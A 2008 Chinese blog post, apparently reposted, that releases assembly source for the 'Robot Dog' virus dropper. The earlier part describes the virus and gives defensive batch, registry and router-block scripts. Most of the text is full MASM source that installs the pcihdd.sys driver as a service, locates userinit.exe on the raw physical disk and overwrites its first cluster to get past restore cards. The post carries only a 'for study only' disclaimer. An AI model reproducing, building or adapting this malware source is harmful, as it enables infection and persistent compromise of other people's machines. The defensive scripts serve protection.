---
title: 机器狗病毒EXE源码发布
description: 源码危害比较大.提供出来只是给大家学习和研究之用.切勿用来做非法勾当..否则后果自负!机器狗的生前身后，曾经有很多人说有穿透还原卡、冰点的病毒，但是在各个论坛都没有样本证据，直到2007年8月29日终于有人在社区里贴出了一个样本。这个病毒没有名字，图标是SONY的机器狗阿宝，就像前辈熊猫烧香一样，大家给它起了个名字叫机器狗。工作原理
date: 2008-02-22 01:42:15
category: 技术文章
tags: ['病毒Virus', '源码']
post_id: 378
alias: jiqigou-bingdu-EXE-yuanma
ViewNums: 7998
---

来源：WinShell
[源码](/tags/%E6%BA%90%E7%A0%81)危害比较大.提供出来只是给大家学习和研究之用.切勿用来做非法勾当..否则后果自负!
机器狗的生前身后，曾经有很多人说有穿透还原卡、冰点的病毒，但是在各个论坛都没有样本证据，直到2007年8月29日终于有人在社区里贴出了一个样本。这个[病毒](/tags/%E7%97%85%E6%AF%92Virus)没有名字，图标是SONY的机器狗阿宝，就像前辈熊猫烧香一样，大家给它起了个名字叫机器狗。

**工作原理:**

机器狗本身会释放出一个pcihdd.sys到drivers目录，pcihdd.sys是一个底层硬盘驱动，提高自己的优先级接替还原卡或冰点的硬盘驱动，然后访问指定的网址，这些网址只要连接就会自动下载大量的病毒与恶意插件。然后修改接管启动管理器，最可怕的是，会通过内部网络传播，一台中招，能引发整个网络的电脑全部自动重启。
重点是，一个[病毒](http://www.virus-info.cn)，如果以hook方式入侵系统，接替硬盘驱动的方式效率太低了，而且毁坏还原的方式这也不是最好的，还有就是这种技术应用范围非常小，只有还原技术厂商范围内有传播，在这方面国际上也只有中国在用，所以，很可能就是行业内杠。
对于网吧而言，机器狗就是剑指网吧而来，针对所有的还原产品设计，可预见其破坏力很快会超过熊猫烧香。好在现在很多免疫补丁都以出现，发稿之日起，各大杀毒[软件](/tags/%E8%BD%AF%E4%BB%B6)都以能查杀。

**免疫补丁之争:**

现在的免疫补丁之数是疫苗形式，以无害的样本复制到drivers下，欺骗病毒以为本身以运行，起到阻止危害的目的。这种形式的问题是，有些用户为了自身安全会在机器上运行一些查毒程序（比如QQ医生之类）。这样疫苗就会被误认为是病毒，又要废很多口舌。

**解决之道:**

最新的解决方案是将system32/drivers目录单独分配给一个用户，而不赋予administror修改的权限。虽然这样能解决，但以后安装驱动就是一件头疼的事了。
来彻底清除该病毒，处理后重启一下电脑就可以了，之前要打上补丁！
或者这样：
1注册表，组策略中禁止运行userinit.exe 进程
2 在启动项目中加入批处理
A : 强制结束userinit.exe进程 Taskkill /f /IM userinit.exe （其中“/IM”参数后面为进程的图像名，这命令只对XP用户有效）
B : 强制删除userinit.exe文件 DEL /F /A /Q %SystemRoot%system32userinit.exe
C : 创建userinit.exe免疫文件到%SystemRoot%system32
命令：

md %SystemRoot%system32userinit.exe >nul 2>nul

或者

md %SystemRoot%system32userinit.exe
attrib +s +r +h +a %SystemRoot%system32userinit.exe
D : reg add "HKLMSOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsuserinit.exe" /v debugger /t reg_sz /d debugfile.exe /f

userinit1.exe是正常文件改了名字，多加了一个1，你也可以自己修改，不过要手动修改这4个注册表，并导出，这个批处理才能正常使用。

**最新动向**

好像机器狗的开发以停止了，从样本放出到现在也没有新的版本被发现，这到让我们非常担心，因为虽着研究的深入，现在防御的手段都是针对病毒工作原理的，一但机器狗开始更新，稍加改变工作原理就能大面积逃脱普遍的防御手段，看来机器狗的爆发只是在等待，而不是大家可以高枕了。
目前网上流传一种叫做机器狗的病毒，此病毒采用hook系统的磁盘设备栈来达到穿透目的的，危害极大，可穿透目前技术条件下的任何软件硬件还原！基本无法靠还原抵挡。目前已知的所有还原产品，都无法防止这种病毒的穿透感染和传播。
机器狗是一个木马下载器，感染后会自动从网络上下载木马、病毒，危及用户帐号的安全。
机器狗运行后会释放一个名为PCIHDD.SYS的驱动文件，与原系统中还原软件驱动进行硬盘控制权的争夺，并通过替换userinit.exe文件，实现开机启动。
>> 那么如何识别是否已中毒呢？
是否中了机器狗的关键就在 Userinit.exe 文件，该文件在系统目录的 system32 文件夹中，点击右键查看属性，如果在属性窗口中看不到该文件的版本标签的话，说明已经中了机器狗。如果有版本标签则正常。

**临时解决办法：**

一是在路由上封IP：
ROS脚本,要的自己加上去

/ip firewall filter
add chain=forward content=yu.8s7.net action=reject comment="DF6.0"
add chain=forward content=www.tomwg.com action=reject

二是在c:windowssystem32drivers下建立免疫文件： pcihdd.sys ，
三是把他要修改的文件在做母盘的时候，就加壳并替换。
在%systemroot%system32drivers目录下 建立个 明字 为 pcihdd.sys 的文件夹 设置属性为 任何人禁止
批处理

md %systemroot%system32driverspcihdd.sys
cacls %systemroot%system32driverspcihdd.sys /e /p everyone:n
cacls %systemroot%system32userinit.exe /e /p everyone:r
exit

目前，网络流行以下解决方法，或者可以在紧急情况下救急：
1、首先在系统system32下复制个无毒的userinit.exe，文件名为FUCKIGM.exe(文件名可以任意取)，这就是下面批处理要指向执行的文件！也就是开机启动userinit.exe的替代品！而原来的userinit.exe保留！其实多复制份的目的只是为了多重保险！可能对防止以后变种起到一定的作用。
2、创建个文件名为userinit.bat的批处理（文件名也可任意取，但要和下面说到的注册表键值保持一致即可），内容如下：
start FUCKIGM.exe (呵呵，够简单吧？)
3、修改注册表键值，将userinit.exe改为userinit.bat。内容如下：

Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon]
"Userinit"="C:\WINDOWS\system32\userinit.bat,"

就这3步，让这条狗再也凶不起来！这是在windows 2003测试的，双击机器狗后，没什么反应，对比批处理也是正常，即这狗根本没改动它！开关机游戏均无异常！但唯一美中不足的是，采用经典模式开机的启动时会出现个一闪而过的黑框！
如果嫌麻烦，也不要紧。上面三条批处理网友已搞好了，直接复制下面的这个存为批处理执行就OK了。三步合二为一

@echo off
:::直接复制系统system32下的无毒userinit.exe为FUCKIGM.exe
cd /d %SystemRoot%system32
copy /y userinit.exe FUCKIGM.exe >nul
:::创建userinit.bat
echo @echo off >>userinit.bat
echo start FUCKIGM.exe >>userinit.bat
:::注册表操作
reg add "HKLMSOFTWAREMicrosoftWindows NTCurrentVersionWinlogon" /v Userinit / t REG_SZ /d "C:WINDOWSsystem32userinit.bat," /f >nul
:::删掉自身（提倡环保）
del /f /q %0
当然，如果实在不行，下载程序killigm。然后直接解压运行里面的程序:机器狗免疫补丁.bat 执行就可以了.
网上流传的另一种新的变种的防止方法 :
开始菜单运行.输入CMD
cd ……到drivers
md pcihdd.sys
cd pcihdd.sys
md 1...

可防止最新变种。请注意：此法只能是防止，对于杀机器狗还得靠最新的杀毒程序才行。
针对该病毒，反病毒专家建议广大用户及时升级杀毒软件病毒库，补齐系统[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)，上网时确保打开“网页监控”、“邮件监控”功能；禁用系统的自动播放功能，防止病毒从U盘、MP3、移动硬盘等移动存储设备进入到计算机；登录网游账号、网络银行账户时采用软键盘输入账号及密码

代码如下:

.386
.model flat,stdcall
option casemap:none

include windows.inc
include user32.inc
include kernel32.inc
include advapi32.inc
includelib advapi32.lib
includelib user32.lib
includelib kernel32.lib

.data
Text            db '对不起,驱动程序的加载没有成功,程序将无法运行.',0
FileName        db '\.PhysicalHardDisk0',0
a_Physicaldrive  db '\.PhysicalDrive0',0
aFCJ            db '分配内存不成功',0
OutputString    db '操作成功', 0
Dst             db 10Ch dup(0)
hModule         dd 0
ERR1            db '寻址文件不成功',0
ERR2            db '不支持的磁盘分区',0
ERR3            db '第一个分区不是启动分区',0
ERR4            db '该文件是压缩文件，不能操作',0
ERR5            db '获取文件原始信息失败',0
ERR6            db '打开文件失败',0
ERR7            db '加载驱动失败',0

.code

Src             db '%SystemRoot%system32driverspcihdd.sys',0
ServiceName     db 'PciHdd',0

;**********************************************************************************************
;退出服务，并删除文件badwolf祝福你好运！http://www.winshell.cn QQ:13699576
;**********************************************************************************************
QuitService proc
LOCAL ServiceStatus
LOCAL hSCObject
LOCAL hSCManager
LOCAL @FileName[100h]:byte

push  0F003Fh    ; dwDesiredAccess
push  0    ; lpDatabaseName
push  0    ; lpMachineName
call  OpenSCManagerA
or  eax, eax
jz  OpenSCManagerFail
mov  hSCManager, eax

push  0F01FFh    ; dwDesiredAccess
push  offset ServiceName ; "PciHdd"
push  hSCManager ; hSCManager
call  OpenServiceA
or  eax, eax
jz  OpenServiceFail
mov  hSCObject, eax
lea  eax, ServiceStatus
push  eax    ; lpServiceStatus
push  1    ; dwControl
push  hSCObject  ; hService
call  ControlService

push  hSCObject  ; hService
call  DeleteService

push  hSCObject  ; hSCObject
call  CloseServiceHandle

OpenServiceFail:    ; hSCObject
push  hSCManager
call  CloseServiceHandle

OpenSCManagerFail:    ; nSize
push  100h
lea  eax, @FileName
push  eax    ; lpDst
push  offset Src  ; "%SystemRoot%\system32\drivers\pcihdd.sys"
call  ExpandEnvironmentStringsA

lea  eax, @FileName
push  eax    ; lpFileName
call  DeleteFileA
ret
QuitService endp

;**********************************************************************************************
;从资源中加载二进制内容写入文件，并将文件写入环境变量，然后启动服务，最后去掉环境变量，删除文件
;**********************************************************************************************
LoadServiceFromRes proc

LOCAL ServiceStatus
LOCAL hSCObject
LOCAL hSCManager
LOCAL nNumberOfBytesToWrite
LOCAL lpBuffer
LOCAL hResInfo
LOCAL @FileName[110h]:byte
LOCAL hObject
LOCAL NumberOfBytesWritten

push  3E9h    ; lpType
push  3E9h    ; lpName
push  hModule    ; hModule
call  FindResourceA
or  eax, eax
jz  failed

mov  hResInfo,  eax
push  eax    ; hResInfo
push  hModule    ; hModule
call  SizeofResource
mov  nNumberOfBytesToWrite, eax

push  hResInfo  ; hResInfo
push  hModule    ; hModule
call  LoadResource
or  eax, eax
jz  failed

push  eax    ; hResData
call  LockResource
or  eax, eax
jz  failed
mov  lpBuffer,  eax

failed:
or  eax, eax
jnz  CONTINUE
jmp  Exit

CONTINUE:    ; nSize
push  100h
lea  eax, @FileName
push  eax    ; lpDst
push  offset Src  ; "%SystemRoot%\system32\drivers\pcihdd.sys"
call  ExpandEnvironmentStringsA

push  0    ; hTemplateFile
push  80h    ; dwFlagsAndAttributes
push  4    ; dwCreationDisposition
push  0    ; lpSecurityAttributes
push  0    ; dwShareMode
push  40000000h  ; dwDesiredAccess
lea  eax, @FileName
push  eax    ; lpFileName
call  CreateFileA
cmp  eax, 0FFFFFFFFh
jnz  short CREATEFILEOK
jmp  Exit

CREATEFILEOK:
mov  hObject, eax
push  0    ; lpOverlapped
lea  eax, NumberOfBytesWritten
push  eax    ; lpNumberOfBytesWritten
push  nNumberOfBytesToWrite ; nNumberOfBytesToWrite
push  lpBuffer  ; lpBuffer
push  hObject   ; hFile
call  WriteFile

push  hObject          ; hFile
call  SetEndOfFile

push  hObject    ; hFile
call  FlushFileBuffers
push  hObject   ; hObject
call  CloseHandle

push  0F003Fh         ; dwDesiredAccess
push  0    ; lpDatabaseName
push  0    ; lpMachineName
call  OpenSCManagerA
or  eax, eax
jz  OpenSCManagerFailed
mov  hSCManager, eax

push  0    ; lpPassword
push  0    ; lpServiceStartName
push  0    ; lpDependencies
push  0    ; lpdwTagId
push  0    ; lpLoadOrderGroup
lea  eax, @FileName
push  eax    ; lpBinaryPathName
push  0    ; dwErrorControl
push  3    ; dwStartType
push  1    ; dwServiceType
push  0    ; dwDesiredAccess
push  offset ServiceName ; "PciHdd"
push  offset ServiceName ; "PciHdd"
push  hSCManager      ; hSCManager
call  CreateServiceA
or  eax, eax
jz  CreateServiceFailed
mov  hSCObject, eax
push  hSCObject  ; hSCObject
call  CloseServiceHandle
jmp  OPENSERVICE

CreateServiceFailed:
push  0F01FFh            ; dwDesiredAccess
push  offset ServiceName ; "PciHdd"
push  hSCManager      ; hSCManager
call  OpenServiceA
or  eax, eax
jz  short OpenServiceFailed
mov  hSCObject, eax
lea  eax, ServiceStatus
push  eax    ; lpServiceStatus
push  1    ; dwControl
push  hSCObject  ; hService
call  ControlService
push  hSCObject  ; hService
call  DeleteService
push  hSCObject  ; hSCObject
call  CloseServiceHandle

OpenServiceFailed:
push  0               ; lpPassword
push  0    ; lpServiceStartName
push  0    ; lpDependencies
push  0    ; lpdwTagId
push  0    ; lpLoadOrderGroup
lea  eax, @FileName
push  eax    ; lpBinaryPathName
push  0    ; dwErrorControl
push  3    ; dwStartType
push  1    ; dwServiceType
push  0    ; dwDesiredAccess
push  offset ServiceName ; "PciHdd"
push  offset ServiceName ; "PciHdd"
push  hSCManager ; hSCManager
call  CreateServiceA
or  eax, eax
jz  QUIT
mov  hSCObject, eax
push  hSCObject  ; hSCObject
call  CloseServiceHandle
jmp  OPENSERVICE

QUIT:
jmp  Exit

OPENSERVICE:
push  10h                ; dwDesiredAccess
push  offset ServiceName ; "PciHdd"
push  hSCManager ; hSCManager
call  OpenServiceA
or  eax, eax
jz  OPENSERVICEFAILED
mov  hSCObject, eax
push  0    ; lpServiceArgVectors
push  0    ; dwNumServiceArgs
push  hSCObject  ; hService
call  StartServiceA
or  eax, eax
jnz  StartServiceOK
jmp  Exit

StartServiceOK:    ; hSCObject
push  hSCObject
call  CloseServiceHandle
push  hSCManager ; hSCObject
call  CloseServiceHandle
jmp  OpenSCManagerFailed

OPENSERVICEFAILED:
push  hSCManager
call  CloseServiceHandle
jmp  Exit

OpenSCManagerFailed:    ; nSize
push  100h
lea  eax, @FileName
push  eax    ; lpDst
push  offset Src  ; "%SystemRoot%\system32\drivers\pcihdd.sys"
call  ExpandEnvironmentStringsA
lea  eax, @FileName
push  eax    ; lpFileName
call  DeleteFileA
ret

Exit:
push  10h
push  0    ; lpCaption
push  offset Text  ; "出错"
push  0    ; hWnd
call  MessageBoxA
push  0    ; uExitCode
call  ExitProcess
LoadServiceFromRes  endp

aSystemrootSyst  db '%SystemRoot%System32Userinit.exe',0
;***************************************************************************************************************
;簇是磁盘使用的基本单元。 组成一个簇的扇区数总是2的幂数，当卷被格式化时此数值是固定的。 此数值称为簇要素，
;通常用字节引用，如8KB，2KB。 NTFS通过每件事的逻辑簇数来寻址。
;逻辑簇数（LCN）:卷里的每个簇都给定了一个顺序号，这是它的逻辑簇数。LCN0(零)指向卷的第一个簇（引导扇区）。
;                用LCN乘以簇的大小就可以算出在卷里的物理偏移量。
;
;实际簇数（VCN）:一个非常驻的流的每个簇都给定了一个顺序号，这是它的实际簇数。VCN0(零)指向这个流的第一个簇。
;               要定位磁盘上的流，就必须把VCN转换成LCN.这是在数据运转的帮助下完成的。
;
;数据运转:每个LCN的连续模块都被赋予了一个数据运转，它包含一个VCN，一个LCN和一个长度。
;         当NTFS需要在磁盘上找到一个对象时，就查看数据运转中的VCN来得到LCN。

;其他信息:
; 1)当卷被格式化时可以选择簇的大小。
; 2)一个卷的簇的大小存储在$Boot里。也定义了此值在一个MFT文件记录和一个索引记录的簇里。
; 3)如果扇区数在用，NTFS通过引用簇数可以寻址更大的磁盘。

;下面是一个关于允许和默认簇的大小的列表：

;Windows NT
;    512 bytes, 1KB, 2KB or 4KB
;Windows 2000, Windows XP
;   512 bytes, 1KB, 2KB, 4KB, 8KB, 16KB, 32KB or 64KB

;卷的大小   默认的簇的大小
;< 512MB   Sector size
;< 1GB    1KB
;< 2GB    2KB
;> 2GB    4KB
;***************************************************************************************************************
DoMyWork proc  lpFileName   ;成功返回值为0

LOCAL lpBuffer
LOCAL nNumberOfBytesToWrite
LOCAL hDevice
LOCAL lDistanceToMove
LOCAL HighOffset
LOCAL dwLowPartofLcn
LOCAL dwHighPartofLcn
LOCAL StartSectorC
LOCAL hFile
LOCAL PhysicalBuff[512]:BYTE
LOCAL Buffer[512]:BYTE
LOCAL OutBuffer[272]:BYTE
LOCAL dwRet
LOCAL DistanceToMoveHigh:DWORD
LOCAL InBuffer[8]:BYTE
LOCAL hObject

pusha
push  0    ; hTemplateFile
push  0    ; dwFlagsAndAttributes
push  3    ; dwCreationDisposition
push  0    ; lpSecurityAttributes
push  0    ; dwShareMode
push  80000000h  ; dwDesiredAccess
push  offset FileName  ; "\\.\PhysicalHardDisk0" 是pcihdd.sys创建的符号链接
call  CreateFileA
cmp  eax, 0FFFFFFFFh
jz  CreateFileFailed
mov  hDevice, eax

push  0    ; hTemplateFile
push  20000000h  ; dwFlagsAndAttributes
push  3    ; dwCreationDisposition
push  0    ; lpSecurityAttributes
push  3    ; dwShareMode
push  80000000h  ; dwDesiredAccess
push  lpFileName  ; 打开userinit.exe
call  CreateFileA
cmp  eax, 0FFFFFFFFh
jz  CreateUserInitFileFailed
mov  hObject, eax

       push    8
       lea     eax,InBuffer
       push    eax
       call    RtlZeroMemory

push  110h            ;初始化
lea  eax, OutBuffer
push  eax
call  RtlZeroMemory

push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpBytesReturned
push  110h    ; nOutBufferSize
lea  eax, OutBuffer
push  eax    ; lpOutBuffer
push  8    ; nInBufferSize
lea  eax, InBuffer
push  eax    ; lpInBuffer
push  90073h    ; dwIoControlCode = FSCTL_GET_RETRIEVAL_POINTERS
push  hObject   ; hDevice
call  DeviceIoControl ;通过FSCTL_GET_RETRIEVAL_POINTERS获取userinit文件数据的分布信息
or  eax, eax
jz  DeviceIoControlFailed

;这个结构是8字节对齐的,结构长度32字节
;typedef struct RETRIEVAL_POINTERS_BUFFER
;{
;    DWORD ExtentCount;
;    LARGE_INTEGER StartingVcn;
;    struct
;    {
;        LARGE_INTEGER NextVcn;
;        LARGE_INTEGER Lcn;
;    } Extents[1];
;} RETRIEVAL_POINTERS_BUFFER, *PRETRIEVAL_POINTERS_BUFFER;

;typedef union union
;{
;   struct
;   {
;       DWORD LowPart;
;       LONG HighPart;
;   };
;   LONGLONG QuadPart;
;} LARGE_INTEGER, *PLARGE_INTEGER;

lea  edi, OutBuffer    ;OutBuffer是上面结构体指针
mov  ebx, [edi]        ;ExtentCount = Extents数组元素个数
lea  edi, [edi+10h]    ;指向Extents数组首地址,根据字节对齐
mov  eax, DistanceToMoveHigh
or  ebx, ebx          ;判断ExtentCount是否为0
jz  ExtentCountIsZero

mov  eax, [edi+8]    ;指向Extents[0].Lcn.LowPart
mov  edx, [edi+0Ch]  ;指向Extents[0].Lcn.HighPart
cmp  eax, 0FFFFFFFFh
jz  FEIHUA
cmp  edx, 0FFFFFFFFh
jz  FEIHUA

mov  dwLowPartofLcn, eax  ;保存lcn低32位
mov  dwHighPartofLcn, edx ;保存lcn高32位

push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpNumberOfBytesRead
push  200h    ; nNumberOfBytesToRead
lea  eax, Buffer
push  eax    ; lpBuffer
push  hObject          ; hFile
call  ReadFile        ;读取userinit文件开头512字节

push  hObject          ; hObject
call  CloseHandle
mov  hObject, 0      ;关闭文件

push  0    ; hTemplateFile
push  0    ; dwFlagsAndAttributes
push  3    ; dwCreationDisposition
push  0    ; lpSecurityAttributes
push  3    ; dwShareMode
push  0C0000000h  ; dwDesiredAccess
push  offset a_Physicaldrive ; "\\.\PhysicalDrive0"
call  CreateFileA        ;打开物理硬盘读写
cmp  eax, 0FFFFFFFFh
jz  OPENPHYSICSFAILED
mov  hFile, eax

push  0    ; dwMoveMethod
push  0    ; lpDistanceToMoveHigh
push  0    ; lDistanceToMove
push  hFile          ; hFile
call  SetFilePointer  ; 定位

push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpNumberOfBytesRead
push  200h    ; nNumberOfBytesToRead
lea  eax, PhysicalBuff
push  eax    ; lpBuffer
push  hFile          ; hFile
call  ReadFile        ;读取硬盘主引导分区MBR
;
;  0000 |------------------------------------------------|
;            |                                                                |
;            |                                                                |
;            |             Master Boot Record               |
;            |                                                                |
;            |                                                                |
;            |             主引导记录(446字节)             |
;            |                                                                |
;            |                                                                |
;            |                                                                |
;      01BD  |                                                         |
;      01BE  |------------------------------------------------|
;            |                                                |
;      01CD  |             分区信息  1(16字节)                |
;      01CE  |------------------------------------------------|
;            |                                                |
;      01DD  |             分区信息  2(16字节)                |
;      01DE  |------------------------------------------------|
;            |                                                |
;      01ED  |             分区信息  3(16字节)                |
;      01EE  |------------------------------------------------|
;            |                                                |
;      01FD  |             分区信息  4(16字节)                |
;            |------------------------------------------------|
;            | 01FE                | 01FF                     |
;            |         55          |           AA             |
;            |------------------------------------------------|
;分区表
;
;    分区表是一个链表，主分区表是分区链表的第一个节点。由于主分区表中只能分四个分区, 无法满足需求, 因此设计了一种扩展分区格式。扩展分区就是分区表的第二个节点到最后一个节点。
;
;    主分区表是从主引导扇区第0x1BE字节开始的，共64个字节，最后是0x55AA。64个字节的分区信息分为四组，每16字节为一组。每组的数据结构是这样的：
;
;typedef struct
;{
;    BYTE  byState;//分区状态, 0 = 未激活, 0x80 = 激活
;    BYTE  byBeginHead;//分区起始磁头号
;    WORD  wBeginSC;//分区起始扇区和柱面号, 底字节的低6位为扇区号, 高2位为柱面号的第 9,10 位, 高字节为柱面号的低 8 位
;    BYTE  byFSID;  //分区类型, 如 0x0B = FAT32, 0x83 = Linux 等, 00 表示此项未用
;    BYTE  byEndHead;//分区结束磁头号
;    WORD  wEndSC;//分区结束扇区和柱面号
;    DWORD dwInfoAreaSectors;//在线性寻址方式下的分区相对扇区地址
;    DWORD dwSectors;//分区大小 (总扇区数)
;} INFOAREA_PARAM;//磁盘的分区信息

lea  edi, PhysicalBuff
cmp  byte ptr [edi+1BEh], 80h  ;byState判断是否为活动分区
jnz  NOTACTIVEDISK
movzx  ebx, byte ptr [edi+1C2h]  ;byFSID判断分区类型
cmp  ebx, 0Bh
jz  FAT32                     ;Win95 FAT32
cmp  ebx, 0Ch
jz  FAT32                     ;Win95 FAT32 LBA
cmp  ebx, 7
jnz  NTFS                      ;HPFS/NTFS

FAT32:
mov  eax, [edi+1C6h]          ;C盘起始扇区（首扇区的相对扇区号）
mov  StartSectorC, eax
xor  edx, edx
imul  eax, 200h                ;求出实际的字节偏移
mov  DistanceToMoveHigh, edx
mov  ecx, eax

push  0    ; dwMoveMethod
lea  eax, DistanceToMoveHigh
push  eax    ; lpDistanceToMoveHigh
push  ecx    ; lDistanceToMove
push  hFile          ; hFile
call  SetFilePointer   ;定位到硬盘C盘起始扇区的绝对位置

push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpNumberOfBytesRead
push  200h    ; nNumberOfBytesToRead
lea  eax, PhysicalBuff
push  eax    ; lpBuffer
push  hFile  ; hFile
call  ReadFile        ;读硬盘C盘起始扇区 即：第一个分区的引导扇区BPB

lea  edi, PhysicalBuff
movzx  eax, word ptr [edi+0Eh]; BPB_RsvdSecCnt = 保留扇区数量
add  StartSectorC, eax
cmp  ebx, 0Bh               ;Win95 FAT32
jz  WIN95FAT32
cmp  ebx, 0Ch               ;Win95 FAT32 LBA
jnz  short FAT32LBA

WIN95FAT32:
movzx  ecx, byte ptr [edi+10h]; BPB_NumFATS = 每个分区占用的FAT表 数
mov  eax, [edi+24h]         ; BPB_FATSz32 = 每个FAT占用扇区数
xor  edx, edx
imul  eax, ecx
add  StartSectorC, eax      ;数据记录起始扇区

FAT32LBA:
mov  eax, dwLowPartofLcn
mov  edx, dwHighPartofLcn
movzx  ecx, byte ptr [edi+0Dh]   ;BPB_SecPerClus =  每簇多少扇区
mov  nNumberOfBytesToWrite, ecx
imul  eax, ecx
add  eax, StartSectorC
adc  edx, 0
imul  eax, 200h             ;求出绝对偏移字节位置
mov  HighOffset, edx       ;偏移高32位
mov  lDistanceToMove, eax  ;低32位

push  0    ; dwMoveMethod
lea  eax, HighOffset
push  eax    ; lpDistanceToMoveHigh
push  lDistanceToMove ; lDistanceToMove
push  hFile          ; hFile
call  SetFilePointer

push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpNumberOfBytesRead
push  200h    ; nNumberOfBytesToRead
lea  eax, PhysicalBuff
push  eax    ; lpBuffer
push  hFile    ; hFile
call  ReadFile        ;在找到的硬盘扇区读

lea  edi, PhysicalBuff
lea  esi, Buffer
mov  ecx, 200h
repe cmpsb              ;通过对比ReadFile读取的文件数据和自己定位后直接读取所得到的文件数据，确定定位是否正确

or  ecx, ecx
jnz  DIFF

push  0    ; dwMoveMethod
lea  eax, HighOffset
push  eax    ; lpDistanceToMoveHigh
push  lDistanceToMove ; lDistanceToMove
push  hFile  ; hFile
call  SetFilePointer  ;重新定位到上面找到的硬盘扇区处

mov  eax, nNumberOfBytesToWrite
shl  eax, 9                      ;这个值是作者估算的
mov  nNumberOfBytesToWrite, eax

push  nNumberOfBytesToWrite ; dwBytes
push  40h          ; uFlags
call  GlobalAlloc
or  eax, eax
jz  ALLOCMEMORYFAILED
mov  lpBuffer,eax

mov  ecx, offset MessageBoxA
sub  ecx, offset Src  ; "%SystemRoot%\system32\drivers\pcihdd.sys"

       ;把整个代码体作为参数传递给pcihdd.sys,控制码0xF0003C04，
push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpBytesReturned
push  nNumberOfBytesToWrite ; nOutBufferSize
push  lpBuffer  ; lpOutBuffer
push  ecx    ; nInBufferSize
push  offset Src  ; "%SystemRoot%\system32\drivers\pcihdd.sys"
push  0F0003C04h  ; dwIoControlCode
push  hDevice    ; hDevice
call  DeviceIoControl

;并将pcihdd返回的数据直接写入userinit.exe的第一簇
push  0    ; lpOverlapped
lea  eax, DistanceToMoveHigh
push  eax    ; lpNumberOfBytesWritten
push  nNumberOfBytesToWrite ; nNumberOfBytesToWrite
push  lpBuffer  ; lpBuffer
push  hFile    ; hFile
call  WriteFile

push  hFile  ; hFile
call  FlushFileBuffers
mov  dwRet, 0
jmp  OVER

ALLOCMEMORYFAILED:
   ; "分配内存不成功"
mov  dwRet, offset aFCJ

OVER:      ; hMem
push  lpBuffer
call  GlobalFree
jmp  FINISHED

DIFF:
mov  dwRet, offset ERR1
jmp  FINISHED

NTFS:
mov  dwRet, offset ERR2
jmp  FINISHED

NOTACTIVEDISK:
mov  dwRet, offset ERR3

FINISHED:    ; hObject
push  hFile
call  CloseHandle
jmp  OPENPHYSICSFAILED

FEIHUA:
mov  dwRet, offset ERR4

OPENPHYSICSFAILED: ;打开硬盘设备失败
jmp  ExtentCountIsZero

DeviceIoControlFailed:
mov  dwRet, offset ERR5

ExtentCountIsZero:
cmp  hObject, 0
jz  ZeroObject
push  hObject  ; hObject
call  CloseHandle
jmp  ZeroObject

CreateUserInitFileFailed:
mov  dwRet, offset ERR6

ZeroObject:    ; hObject
push  hDevice
call  CloseHandle
jmp  EXIT

CreateFileFailed:
mov  dwRet, offset ERR7

EXIT:
popa
mov  eax, dwRet
ret
DoMyWork endp

start proc
push  0    ; lpModuleName
call  GetModuleHandleA
mov  hModule, eax
call  LoadServiceFromRes ;load service from resource

push  100h    ; nSize
push  offset Dst  ; lpDst
push  offset aSystemrootSyst ; "%SystemRoot%\System32\Userinit.exe"
call  ExpandEnvironmentStringsA

push  offset Dst  ; lpFileName
call  DoMyWork
or  eax, eax
jnz  FAILED
push  offset OutputString ;
call  OutputDebugStringA
jmp  Exit

FAILED:    ; lpOutputString
push  eax
call  OutputDebugStringA

Exit:
call  QuitService
push  0    ; uExitCode
call  ExitProcess
start endp

end start

**相关文章：**

[机器狗病毒生成器](/blog/jiqigou-shengchengqi)

[穿透还原的工作原理分析（逆向工程）--机器狗](/blog/chuanhuanyuan-jiqigou)

[机器狗写入到userinit.exe文件的下载者源码](/blog/jiqigou-xieru-userinitexe-yuanma)

